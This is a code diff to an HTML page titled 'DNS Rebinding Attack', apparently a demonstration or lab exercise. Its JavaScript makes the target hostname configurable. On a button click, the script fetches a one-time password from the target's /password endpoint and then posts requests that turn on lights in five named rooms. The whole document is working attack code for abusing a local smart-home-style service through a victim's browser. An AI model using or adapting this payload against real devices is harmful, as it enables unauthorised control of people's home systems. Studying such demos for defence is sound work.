@@ -15,35 +15,37 @@
     <body>
         <div class="container" style="text-align: center">
    	        <h1>DNS Rebinding Attack</h1>
+            <h1 id="hostname" hidden>{{ hostname }}</h1>
             <button type="button" class="btn" onclick="launchAttack()">Try me!</button>
         </div>
         <script>
             function launchAttack() {
-                console.log('Launching attack...');
-                attackRoom("hallway");
-                attackRoom("kitchen");
-                attackRoom("bedroom");
-                attackRoom("livingroom");
-                attackRoom("bathroom");
+                var hostname = document.getElementById("hostname").innerHTML;
+                console.log('Launching attack against ' + hostname);
+                attackRoom(hostname, "hallway");
+                attackRoom(hostname, "kitchen");
+                attackRoom(hostname, "bedroom");
+                attackRoom(hostname, "livingroom");
+                attackRoom(hostname, "bathroom");
                 console.log('Attack finished!');
             }
 
-            function attackRoom(room) {
-                var url = "http://localhost:8080/password";
+            function attackRoom(hostname, room) {
+                var url = "http://"+hostname+"/password";
                 var http = new XMLHttpRequest();
                 http.open("GET", url, false);
                 http.onreadystatechange = function() {
                     if(http.readyState == 4 && http.status == 200) {
                         otp = JSON.parse(this.responseText).otp
                         console.log(otp)
-                        turnLightsOn(room, otp); 
+                        turnLightsOn(hostname, room, otp); 
                     }
                 }
                 http.send();
             }
 
-            function turnLightsOn(room, otp) {
-                var url = "http://localhost:8080/lights?room="+room+"&value=true&otp="+otp;
+            function turnLightsOn(hostname, room, otp) {
+                var url = "http://"+hostname +"/lights?room="+room+"&value=true&otp="+otp;
                 var http = new XMLHttpRequest();
                 http.open("POST", url, false);
                 http.onreadystatechange = function() {
